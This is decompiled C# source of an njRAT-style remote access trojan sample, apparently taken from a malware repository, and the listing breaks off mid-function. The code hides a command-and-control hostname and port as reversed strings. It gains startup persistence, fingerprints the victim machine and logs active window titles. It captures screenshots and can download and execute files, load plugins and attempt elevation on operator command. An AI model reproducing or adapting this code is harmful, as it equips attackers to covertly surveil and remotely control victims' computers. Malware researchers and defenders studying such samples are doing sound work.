// Decompiled with JetBrains decompiler
// Type: L
// Assembly: Stub, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 71059202-D212-478D-A32D-37C2A42B8285
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-617d6beb4fdb64c136fbb158c0151c72065cb37866b4287f538e236b31d76d38.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public class L
{
  public static string P;
  public static string x = "https://2555";
  public static string RG = "Windows";
  public static string sf = "nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS";
  public static string VN = "SGFjS2Vk";
  public static string Y = "|-F-|";
  public static string H;
  public static string ss = "https://gro.otpoh.detaogadniksirepsev";
  public static bool BD = Conversions.ToBoolean("False");
  public static bool Idr = Conversions.ToBoolean("False");
  public static bool IsF = Conversions.ToBoolean("False");
  public static bool Isu = Conversions.ToBoolean("True");
  public static bool att = Conversions.ToBoolean("True");
  public static bool DIC = Conversions.ToBoolean("False");
  public static string DR = "TEMP";
  public static string EXE = "Payload.exe";
  public static string Time = "4";
  public static string lastcap = "";
  public static string VU = "v2.0";
  public static string DS = "Put discord title link to receive notifications !!";
  public static WindowsIdentity Str_0 = WindowsIdentity.GetCurrent();
  public static WindowsPrincipal Str_1 = new WindowsPrincipal(L.Str_0);
  public static object Fc = (object) L.Str_1.IsInRole(WindowsBuiltInRole.Administrator).ToString().Replace("False", "User").Replace("True", "Admin");
  public static string LIH = Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + L.RG + ".exe";
  public static string rgg = Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + L.RG + ".URL";
  private static byte[] b = new byte[5121];
  public static TcpClient FCC = (TcpClient) null;
  public static bool Cn = false;
  public static object PLG = (object) null;
  public static Computer F = new Computer();
  public static FileStream FS;
  public static FileInfo LO = new FileInfo(Assembly.GetEntryAssembly().Location);
  private static MemoryStream MeM = new MemoryStream();
  public static object MT = (object) null;

  private static void LOP(object a0) => L.Ind((byte[]) a0);

  [STAThread]
  public static void main()
  {
    try
    {
      object objectValue1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell")), (System.Type) null, "CreateShortcut", new object[1]
      {
        (object) (Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + L.RG + ".lnk")
      }, (string[]) null, (System.Type[]) null, (bool[]) null))));
      NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue1), (System.Type) null, "TargetPath", new object[1]
      {
        (object) (Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + L.RG + ".exe")
      }, (string[]) null, (System.Type[]) null);
      NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue1), (System.Type) null, "Save", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
      object objectValue2 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell")), (System.Type) null, "CreateShortcut", new object[1]
      {
        (object) (Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + L.RG + ".lnk")
      }, (string[]) null, (System.Type[]) null, (bool[]) null))));
      NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue2), (System.Type) null, "TargetPath", new object[1]
      {
        (object) (Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + L.RG + ".exe")
      }, (string[]) null, (System.Type[]) null);
      NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue2), (System.Type) null, "Save", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    L.ko();
  }

  private static void _Lambda__2(object a0, SessionEndingEventArgs a1) => L.ED();

  [DllImport("user32.dll", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int GetWindowTextLength(long hwnd);

  public static string ACT()
  {
    string str1;
    try
    {
      IntPtr foregroundWindow = L.GetForegroundWindow();
      if (foregroundWindow == IntPtr.Zero)
        return "";
      string str2 = Strings.Space(checked (L.GetWindowTextLength((long) foregroundWindow) + 1));
      L.GetWindowText(foregroundWindow, ref str2, str2.Length);
      str1 = L.ENB(ref str2);
    }
    catch (Exception ex1)
    {
      ProjectData.SetProjectError(ex1);
      Exception ex2 = ex1;
      ProjectData.SetProjectError(ex2);
      ProjectData.SetProjectError(ex2);
      str1 = "";
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    return str1;
  }

  public static string BS(ref byte[] B) => Encoding.UTF8.GetString(B);

  public static bool Cam()
  {
    try
    {
      int num = 0;
      do
      {
        string str1 = (string) null;
        int wDriver = (int) checked ((short) num);
        string str2 = Strings.Space(100);
        ref string local1 = ref str2;
        ref string local2 = ref str1;
        if (L.capGetDriverDescriptionA((short) wDriver, ref local1, 100, ref local2, 100))
          return true;
        checked { ++num; }
      }
      while (num <= 4);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    return false;
  }

  [DllImport("avicap32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern bool capGetDriverDescriptionA(
    short wDriver,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName,
    int cbName,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer,
    int cbVer);

  public static bool connect()
  {
    L.Cn = false;
    Thread.Sleep(2000);
    lock (L.LO)
    {
      try
      {
        if (L.FCC != null)
        {
          try
          {
            L.FCC.Close();
            L.FCC = (TcpClient) null;
          }
          catch (Exception ex1)
          {
            ProjectData.SetProjectError(ex1);
            Exception ex2 = ex1;
            ProjectData.SetProjectError(ex2);
            ProjectData.SetProjectError(ex2);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
        }
        try
        {
          L.MeM.Dispose();
        }
        catch (Exception ex3)
        {
          ProjectData.SetProjectError(ex3);
          Exception ex4 = ex3;
          ProjectData.SetProjectError(ex4);
          ProjectData.SetProjectError(ex4);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex5)
      {
        ProjectData.SetProjectError(ex5);
        Exception ex6 = ex5;
        ProjectData.SetProjectError(ex6);
        ProjectData.SetProjectError(ex6);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        L.MeM = new MemoryStream();
        L.FCC = new TcpClient();
        L.FCC.ReceiveBufferSize = 204800;
        L.FCC.SendBufferSize = 204800;
        L.FCC.Client.SendTimeout = 10000;
        L.FCC.Client.ReceiveTimeout = 10000;
        L.FCC.Connect(L.H, Conversions.ToInteger(L.P));
        L.Cn = true;
        L.Send(L.inf());
        try
        {
          string str1;
          string str2;
          if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(L.GTV("vn", (object) "")), (object) "", false))
          {
            str2 = str1 + L.DEB(ref L.VN) + "\r\n";
          }
          else
          {
            string str3 = str1;
            string s = Conversions.ToString(RuntimeHelpers.GetObjectValue(L.GTV("vn", (object) "")));
            string str4 = L.DEB(ref s);
            str2 = str3 + str4 + "\r\n";
          }
          string s1 = str2 + L.H + ":" + L.P + "\r\n" + L.DR + "\r\n" + L.EXE + "\r\n" + Conversions.ToString(L.Idr) + "\r\n" + Conversions.ToString(L.IsF) + "\r\n" + Conversions.ToString(L.Isu) + "\r\n" + Conversions.ToString(L.BD);
          L.Send("inf" + L.Y + L.ENB(ref s1));
        }
        catch (Exception ex7)
        {
          ProjectData.SetProjectError(ex7);
          Exception ex8 = ex7;
          ProjectData.SetProjectError(ex8);
          ProjectData.SetProjectError(ex8);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex9)
      {
        ProjectData.SetProjectError(ex9);
        Exception ex10 = ex9;
        ProjectData.SetProjectError(ex10);
        ProjectData.SetProjectError(ex10);
        L.Cn = false;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    return L.Cn;
  }

  public static string DEB(ref string s)
  {
    byte[] B = Convert.FromBase64String(s);
    return L.BS(ref B);
  }

  public static void DLV(string n)
  {
    try
    {
      L.F.Registry.CurrentUser.OpenSubKey("Software\\" + L.RG, true).DeleteValue(n);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
  }

  public static void ED() => L.pr(0);

  public static string ENB(ref string s) => Convert.ToBase64String(L.SB(ref s));

  [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern IntPtr GetForegroundWindow();

  [DllImport("kernel32", EntryPoint = "GetVolumeInformationA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetVolumeInformation(
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer,
    int nVolumeNameSize,
    ref int lpVolumeSerialNumber,
    ref int lpMaximumComponentLength,
    ref int lpFileSystemFlags,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer,
    int nFileSystemNameSize);

  [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int GetWindowText(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

  public static object GTV(string n, object ret)
  {
    object objectValue;
    try
    {
      objectValue = RuntimeHelpers.GetObjectValue(L.F.Registry.CurrentUser.OpenSubKey("Software\\" + L.RG).GetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(ret)))));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      objectValue = RuntimeHelpers.GetObjectValue(ret);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    return objectValue;
  }

  private static string HWD()
  {
    string str;
    try
    {
      string lpVolumeNameBuffer = (string) null;
      int lpMaximumComponentLength = 0;
      int lpFileSystemFlags = 0;
      string lpFileSystemNameBuffer = (string) null;
      string lpRootPathName = Interaction.Environ("SystemDrive") + "\\";
      int lpVolumeSerialNumber;
      L.GetVolumeInformation(ref lpRootPathName, ref lpVolumeNameBuffer, 0, ref lpVolumeSerialNumber, ref lpMaximumComponentLength, ref lpFileSystemFlags, ref lpFileSystemNameBuffer, 0);
      str = Conversion.Hex(lpVolumeSerialNumber);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      str = "ERR";
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    return str;
  }

  private static void ASMIN(
    bool isCritical,
    ref bool refWasCritical,
    bool needSystemCriticalBreaks)
  {
  }

  [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
  public static void Ind(byte[] b)
  {
    string[] strArray1 = Strings.Split(L.BS(ref b), L.Y);
    try
    {
      string Left1 = strArray1[0];
      string Left2 = Left1;
      if (Operators.CompareString(Left2, "AW", false) == 0)
      {
        new Process()
        {
          StartInfo = {
            WindowStyle = ProcessWindowStyle.Hidden,
            FileName = Application.ExecutablePath,
            UseShellExecute = true,
            Verb = "runas",
            Arguments = ""
          }
        }.Start();
        try
        {
          bool refWasCritical;
          L.ASMIN(false, ref refWasCritical, false);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        Environment.Exit(0);
      }
      else if (Operators.CompareString(Left2, "TMP", false) == 0)
        L.Send("TMP");
      else if (Operators.CompareString(Left2, "RNS", false) == 0)
        L.Send("RNS");
      else if (Operators.CompareString(Left2, "Setting_Chat", false) == 0)
      {
        L.Send("Setting_Chat");
      }
      else
      {
        if (Operators.CompareString(Left2, "ll", false) == 0)
        {
          L.Cn = false;
          return;
        }
        if (Operators.CompareString(Left2, "prof", false) == 0)
        {
          string Left3 = strArray1[1];
          if (Operators.CompareString(Left3, "~", false) == 0)
          {
            L.STV(strArray1[2], (object) strArray1[3], RegistryValueKind.String);
            return;
          }
          if (Operators.CompareString(Left3, "!", false) == 0)
          {
            L.STV(strArray1[2], (object) strArray1[3], RegistryValueKind.String);
            L.Send(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject((object) ("getvalue" + L.Y + strArray1[1] + L.Y), RuntimeHelpers.GetObjectValue(L.GTV(strArray1[1], (object) ""))))));
            return;
          }
          if (Operators.CompareString(Left3, "@", false) != 0)
            return;
          L.DLV(strArray1[2]);
          return;
        }
      }
      if (Operators.CompareString(Left1, "rn", false) == 0)
      {
        byte[] bytes;
        if (strArray1[2][0] == '\u001F')
        {
          try
          {
            MemoryStream memoryStream = new MemoryStream();
            int length = (strArray1[0] + L.Y + strArray1[1] + L.Y).Length;
            memoryStream.Write(b, length, checked (b.Length - length));
            bytes = L.ZIP(memoryStream.ToArray());
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            L.Send("MSG" + L.Y + "Execute ERROR");
            L.Send("bla");
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
            return;
          }
        }
        L.Send("bla");
        string str = Path.GetTempFileName() + "." + strArray1[1];
        try
        {
          System.IO.File.WriteAllBytes(str, bytes);
          Process.Start(str);
          L.Send("MSG" + L.Y + "Executed As " + new FileInfo(str).Name);
        }
        catch (Exception ex1)
        {
          ProjectData.SetProjectError(ex1);
          Exception ex2 = ex1;
          ProjectData.SetProjectError(ex2);
          Exception exception = ex2;
          L.Send("MSG" + L.Y + "Execute ERROR " + exception.Message);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      else
      {
        string Left4 = Left1;
        if (Operators.CompareString(Left4, "inv", false) == 0)
        {
          byte[] numArray = (byte[]) L.GTV(strArray1[1], (object) new byte[0]);
          if (strArray1[3].Length < 10 & numArray.Length == 0)
          {
            L.Send("pl" + L.Y + strArray1[1] + L.Y + Conversions.ToString(1));
          }
          else
          {
            if (strArray1[3].Length > 10)
            {
              MemoryStream memoryStream = new MemoryStream();
              int length = (strArray1[0] + L.Y + strArray1[1] + L.Y + strArray1[2] + L.Y).Length;
              memoryStream.Write(b, length, checked (b.Length - length));
              numArray = L.ZIP(memoryStream.ToArray());
              L.STV(strArray1[1], (object) numArray, RegistryValueKind.Binary);
            }
            L.Send("pl" + L.Y + strArray1[1] + L.Y + Conversions.ToString(0));
            object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(L.Plugin(numArray, "A"))));
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "h", new object[1]
            {
              (object) L.H
            }, (string[]) null, (System.Type[]) null);
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "p", new object[1]
            {
              (object) L.P
            }, (string[]) null, (System.Type[]) null);
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "osk", new object[1]
            {
              (object) strArray1[2]
            }, (string[]) null, (System.Type[]) null);
            NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "start", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
            while (!Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(Operators.OrObject((object) !L.Cn, RuntimeHelpers.GetObjectValue(Operators.CompareObjectEqual(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "Off", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)), (object) true, false))))))
              Thread.Sleep(1);
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "off", new object[1]
            {
              (object) true
            }, (string[]) null, (System.Type[]) null);
          }
        }
        else if (Operators.CompareString(Left4, "ret", false) == 0)
        {
          byte[] numArray = (byte[]) L.GTV(strArray1[1], (object) new byte[0]);
          if (strArray1[2].Length < 10 & numArray.Length == 0)
          {
            L.Send("pl" + L.Y + strArray1[1] + L.Y + Conversions.ToString(1));
          }
          else
          {
            if (strArray1[2].Length > 10)
            {
              MemoryStream memoryStream = new MemoryStream();
              int length = (strArray1[0] + L.Y + strArray1[1] + L.Y).Length;
              memoryStream.Write(b, length, checked (b.Length - length));
              numArray = L.ZIP(memoryStream.ToArray());
              L.STV(strArray1[1], (object) numArray, RegistryValueKind.Binary);
            }
            L.Send("pl" + L.Y + strArray1[1] + L.Y + Conversions.ToString(0));
            object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(L.Plugin(numArray, "A"))));
            string[] strArray2 = new string[5]
            {
              "ret",
              L.Y,
              strArray1[1],
              L.Y,
              null
            };
            string[] strArray3 = strArray2;
            string s = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "GT", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)));
            string str = L.ENB(ref s);
            strArray3[4] = str;
            L.Send(string.Concat(strArray2));
          }
        }
        else if (Operators.CompareString(Left4, "CAP", false) == 0)
        {
          Rectangle targetRect = Screen.PrimaryScreen.Bounds;
          Bitmap bitmap1 = new Bitmap(Screen.PrimaryScreen.Bounds.Width, targetRect.Height, PixelFormat.Format16bppRgb555);
          Graphics g = Graphics.FromImage((Image) bitmap1);
          Size size = new Size(bitmap1.Width, bitmap1.Height);
          g.CopyFromScreen(0, 0, 0, 0, size, CopyPixelOperation.SourceCopy);
          try
          {
            size = new Size(32, 32);
            targetRect = new Rectangle(Cursor.Position, size);
            Cursors.Default.Draw(g, targetRect);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
          g.Dispose();
          Bitmap bitmap2 = new Bitmap(Conversions.ToInteger(strArray1[1]), Conversions.ToInteger(strArray1[2]));
          Graphics graphics = Graphics.FromImage((Image) bitmap2);
          graphics.DrawImage((Image) bitmap1, 0, 0, bitmap2.Width, bitmap2.Height);
          graphics.Dispose();
          MemoryStream memoryStream1 = new MemoryStream();
          string S = "CAP" + L.Y;
          b = L.SB(ref S);
          memoryStream1.Write(b, 0, b.Length);
          MemoryStream memoryStream2 = new MemoryStream();
          bitmap2.Save((Stream) memoryStream2, ImageFormat.Jpeg);
          string Left5 = L.md5(memoryStream2.ToArray());
          if (Operators.CompareString(Left5, L.lastcap, false) != 0)
          {
            L.lastcap = Left5;
            memoryStream1.Write(memoryStream2.ToArray(), 0, checked ((int) memoryStream2.Length));
          }
          else
            memoryStream1.WriteByte((byte) 0);
          L.Sendb(memoryStream1.ToArray());
          memoryStream1.Dispose();
          memoryStream2.Dispose();
          bitmap1.Dispose();
          bitmap2.Dispose();
        }
        else if (Operators.CompareString(Left4, "un", false) == 0)
        {
          string Left6 = strArray1[1];
          if (Operators.CompareString(Left6, "~", false) == 0)
            L.UNS();
          else if (Operators.CompareString(Left6, "!", false) == 0)
          {
            L.pr(0);
            ProjectData.EndApp();
          }
          else
          {
            if (Operators.CompareString(Left6, "@", false) != 0)
              return;
            L.pr(0);
            Process.Start(L.LO.FullName);
            ProjectData.EndApp();
          }
        }
        else if (Operators.CompareString(Left1, "Ex", false) == 0)
        {
          if (L.PLG == null)
          {
            L.Send("PLG");
            int num = 0;
            while (!(L.PLG != null | num == 20 | !L.Cn))
            {
              checked { ++num; }
              Thread.Sleep(1000);
            }
            if (L.PLG == null | !L.Cn)
              return;
          }
          object[] Arguments = new object[1]{ (object) b };
          bool[] CopyBack = new bool[1]{ true };
          NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(L.PLG), (System.Type) null, "ind", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
          if (!CopyBack[0])
            return;
          b = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Arguments[0]))), typeof (byte[]));
        }
        else
        {
          if (Operators.CompareString(Left1, "PLG", false) != 0)
            return;
          MemoryStream memoryStream = new MemoryStream();
          int length = (strArray1[0] + L.Y).Length;
          memoryStream.Write(b, length, checked (b.Length - length));
          L.PLG = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(L.Plugin(L.ZIP(memoryStream.ToArray()), "A"))));
          NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(L.PLG), (System.Type) null, "H", new object[1]
          {
            (object) L.H
          }, (string[]) null, (System.Type[]) null);
          NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(L.PLG), (System.Type) null, "P", new object[1]
          {
            (object) L.P
          }, (string[]) null, (System.Type[]) null);
          NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(L.PLG), (System.Type) null, "c", new object[1]
          {
            (object) L.FCC
          }, (string[]) null, (System.Type[]) null);
        }
      }
    }
    catch (Exception ex3)
    {
      ProjectData.SetProjectError(ex3);
      Exception ex4 = ex3;
      ProjectData.SetProjectError(ex4);
      Exception exception = ex4;
      if (strArray1.Length > 0)
      {
        if (Operators.CompareString(strArray1[0], "Ex", false) == 0 | Operators.CompareString(strArray1[0], "PLG", false) == 0)
          L.PLG = (object) null;
      }
      try
      {
        L.Send("ER" + L.Y + strArray1[0] + L.Y + exception.Message);
      }
      catch (Exception ex5)
      {
        ProjectData.SetProjectError(ex5);
        ProjectData.SetProjectError(ex5);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
  }

  public static string inf()
  {
    string str1 = "ll" + L.Y;
    string str2;
    try
    {
      if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(L.GTV("vn", (object) "")), (object) "", false))
      {
        string str3 = str1;
        string s = L.DEB(ref L.VN) + " : C [ " + L.HWD() + " ]";
        string str4 = L.ENB(ref s);
        string y = L.Y;
        str2 = str3 + str4 + y;
      }
      else
      {
        string str5 = str1;
        string s1 = Conversions.ToString(RuntimeHelpers.GetObjectValue(L.GTV("vn", (object) "")));
        string s2 = L.DEB(ref s1) + "_" + L.HWD();
        string str6 = L.ENB(ref s2);
        string y = L.Y;
        str2 = str5 + str6 + y;
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      string str7 = str1;
      string s = L.HWD();
      string str8 = L.ENB(ref s);
      string y = L.Y;
      str2 = str7 + str8 + y;
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    string str9;
    try
    {
      str9 = str2 + Environment.UserName + L.Y;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      str9 = str2 + "??" + L.Y;
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    string Left;
    try
    {
      Left = str9 + L.LO.LastWriteTime.Date.ToString("yy-MM-dd") + L.Y;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      Left = str9 + "??" + L.Y;
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    string str10;
    try
    {
      str10 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) Left, L.Fc), (object) L.Y));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      str10 = Left + "??-??-??" + L.Y;
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    string str11 = L.F.Info.OSFullName.Replace("Microsoft", "").Replace("x", "X").Replace("X", "X").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win");
    string str12 = str10 + "..." + L.Y + str11.Substring(0, 5) + L.Y;
    string str13;
    try
    {
      str13 = str12 + L.F.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win");
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      str13 = str12 + "??";
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    string str14 = str13 + "SP";
    string str15;
    try
    {
      string[] strArray = Strings.Split(Environment.OSVersion.ServicePack);
      if (strArray.Length == 1)
        str14 += "0";
      str15 = str14 + strArray[checked (strArray.Length - 1)];
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      str15 = str14 + "0";
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    string str16;
    try
    {
      str16 = !Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86") ? str15 + " x86" + L.Y : str15 + " x64" + L.Y;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      str16 = str15 + L.Y;
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    string str17 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(!L.Cam() ? (object) (str16 + "No" + L.Y) : (object) (str16 + "Yes" + L.Y), L.Fc), (object) L.Y), (object) ".."), (object) L.Y), (object) L.VU), (object) L.Y), (object) L.ACT()), (object) L.Y));
    string str18 = "";
    try
    {
      string[] valueNames = L.F.Registry.CurrentUser.CreateSubKey("Software\\" + L.RG, RegistryKeyPermissionCheck.Default).GetValueNames();
      int index = 0;
      while (index < valueNames.Length)
      {
        string str19 = valueNames[index];
        if (str19.Length == 32)
          str18 = str18 + str19 + ",";
        checked { ++index; }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    return str17 + str18;
  }

  [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
  public static void ko()
  {
    try
    {
      L.sf = Strings.StrReverse(L.sf);
      L.x = L.x.Replace("https://", "");
      L.P = Strings.StrReverse(L.x);
      L.ss = L.ss.Replace("https://", "");
      L.H = Strings.StrReverse(L.ss);
      int integer = Conversions.ToInteger(L.Time);
      while (integer != 0)
      {
        Thread.Sleep(1000);
        checked { --integer; }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    if (Interaction.Command() != null)
    {
      try
      {
        L.F.Registry.CurrentUser.SetValue("di", (object) "!");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      Thread.Sleep(5000);
    }
    bool createdNew = false;
    L.MT = (object) new Mutex(true, L.RG, out createdNew);
    if (!createdNew)
      ProjectData.EndApp();
    L.INS();
    if (!L.Idr)
    {
      L.EXE = L.LO.Name;
      L.DR = L.LO.Directory.Name;
    }
    new Thread(new ThreadStart(L.RC), 1).Start();
    int num = 0;
    string Left = "";
    if (L.BD)
    {
      try
      {
        SystemEvents.SessionEnding += new SessionEndingEventHandler(L._Lambda__2);
        L.pr(1);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    while (true)
    {
      Thread.Sleep(1000);
      if (!L.Cn)
        Left = "";
      Application.DoEvents();
      try
      {
        checked { ++num; }
        if (num == 5)
        {
          try
          {
            Process.GetCurrentProcess().MinWorkingSet = (IntPtr) 1024;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
        }
        if (num >= 8)
        {
          num = 0;
          string Right = L.ACT();
          if (Operators.CompareString(Left, Right, false) != 0)
          {
            Left = Right;
            L.Send("act" + L.Y + Right);
          }
        }
        if (L.Isu)
        {
          try
          {
